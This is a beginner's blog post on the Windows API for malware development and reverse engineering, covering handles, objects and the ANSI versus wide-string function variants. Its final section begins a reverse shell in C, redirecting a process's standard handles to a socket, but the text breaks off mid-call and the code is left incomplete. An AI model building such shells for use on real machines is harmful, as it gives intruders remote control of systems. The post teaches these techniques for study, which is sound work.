---
layout: post
title:  "Using and Abusing the Windows API"
date:   2024-12-25 15:00:00 -0600
categories: cybersecurity maldev networking
---

# Importance of the Windows API

The Windows API is central to developing tools and malware for machines running Windows. A basic understanding is crucial to learning cybersecurity and reverse engineering, I will run you through things I wish that I knew before I jumped into the documentation. 📚 

> This is definitly more of an absolute beginner's guide. If you already understand basics like W vs A functions, Handles, Access Tokens, etc., there is probably not much for you here.

# Handles and Objects

Handles appear everywhere in the API, especially when you are developing or reverse engineering malware. Creating processes, injecting into processes, duplicating tokens, changing registry keys, these are all things that require handles.

Handles refer to objects, system *things* that a programmer might want to interact with like tokens, processes, etc.

Instead of rewording it, here is the exact explaination from the [Windows Documentation](https://learn.microsoft.com/en-us/windows/win32/sysinfo/handles-and-objects).

>An object is a data structure that represents a system resource, such as a file, thread, or graphic image. Your application can't directly access object data, nor the system resource that an object represents. Instead, your application must obtain an object handle, which it can use to examine or modify the system resource. Each handle has an entry in an internally maintained table. Those entries contain the addresses of the resources, and the means to identify the resource type.

Handles are of type `HANDLE`.

# Quick Note on Windows functions.

If you take a look at the Windows docs, you will find that almost every function has both an A and W version, like `CreateProcessA` vs `CreateProcessW`. These two functions will do the same thing, however functions labeled with A use ANSI strings for input and output (1 Byte `char` strings), while W functions us Wide Strings for input and output (2 Byte `wchar_t` strings). Both types will be useful to us so keep track of them.

When writing wide strings, preceed them with an uppercase L.

{% highlight c %}
wchar_t message[] = L"Hello World!";
{% endhighlight %}

# Baby's First Reverse Shell

A great point that easily uses the Windows API for fun and profit is always some form of reverse shell. Look at the following example.

{% highlight c %}
int sockfd; // Lets assume we already have an open socket to communicate on.

STARTUPINFO sInfo;
memset(&sInfo, 0, sizeof sInfo);
sInfo.cb = sizeof sInfo;
sInfo.hStdInput = (HANDLE)sockfd;
sInfo.hStdOutput = (HANDLE)sockfd;
sInfo.hStdError = (HANDLE)sockfd;
sInfo.dwFlags = STARTF_USESTDHANDLES;

PROCESS_INFORMATION pInfo;

CreateProcessA(")
